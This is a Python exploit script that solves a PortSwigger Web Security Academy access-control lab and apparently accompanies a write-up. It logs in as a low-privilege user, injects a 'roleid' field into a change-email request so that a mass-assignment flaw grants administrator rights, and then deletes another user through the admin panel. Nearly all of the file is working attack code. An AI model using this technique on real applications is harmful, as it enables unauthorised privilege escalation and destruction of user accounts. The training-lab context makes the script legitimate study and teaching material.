#!/usr/bin/env python3
"""
User role can be modified in user profile
PortSwigger Web Security Academy -- Access Control

Companion script for the writeup: 04-user-role-modified-in-user-profile.md

What this does:
    Logs in as wiener and sends the change-email request with an extra
    "roleid": 2 field injected into the JSON body. The endpoint has no
    allow-list of editable fields, so it writes roleid straight into the
    user record along with the email. With the role elevated, /admin becomes
    reachable; the script locates carlos's delete link and follows it.

Usage:
    python 04-user-role-modified-in-user-profile.py <lab-url>

Requirements:
    pip install httpx
"""

import re
import sys
import httpx
from urllib.parse import urljoin


def get_csrf(html: str) -> str:
    m = re.search(r'name="csrf"\s+value="([^"]+)"', html)
    return m.group(1) if m else ""


def login(client: httpx.Client, base: str, username: str, password: str) -> httpx.Response:
    login_page = client.get(f"{base}/login")
    csrf = get_csrf(login_page.text)
    return client.post(f"{base}/login", data={"csrf": csrf, "username": username, "password": password})


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    login(client, lab_url, "wiener", "peter")

    resp = client.post(f"{lab_url}/my-account/change-email", json={
        "email": "pwned@exploit.com",
        "roleid": 2,
    })
    print(f"[*] Change email with roleid=2: {resp.status_code}")
    if resp.headers.get("content-type", "").startswith("application/json"):
        print(f"[*] Response: {resp.text[:300]}")

    resp = client.get(f"{lab_url}/admin")
    print(f"[*] /admin: {resp.status_code}")

    delete_match = re.search(r'href="([^"]*\?username=carlos[^"]*)"', resp.text, re.IGNORECASE)
    if not delete_match:
        delete_match = re.search(r'href="([^"]*delete[^"]*carlos[^"]*)"', resp.text, re.IGNORECASE)

    if delete_match:
        delete_path = delete_match.group(1)
        delete_url = f"{lab_url}{delete_path}" if delete_path.startswith("/") else urljoin(f"{lab_url}/admin/", delete_path)
        print(f"[*] Deleting carlos via: {delete_url}")
        client.get(delete_url)
    else:
        print("[*] No delete link found, trying common delete pattern")
        client.get(f"{lab_url}/admin/delete", params={"username": "carlos"})

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- carlos deleted after roleid mass-assignment.")
    else:
        print("[-] Not solved yet -- check whether roleid=2 actually elevated the account.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
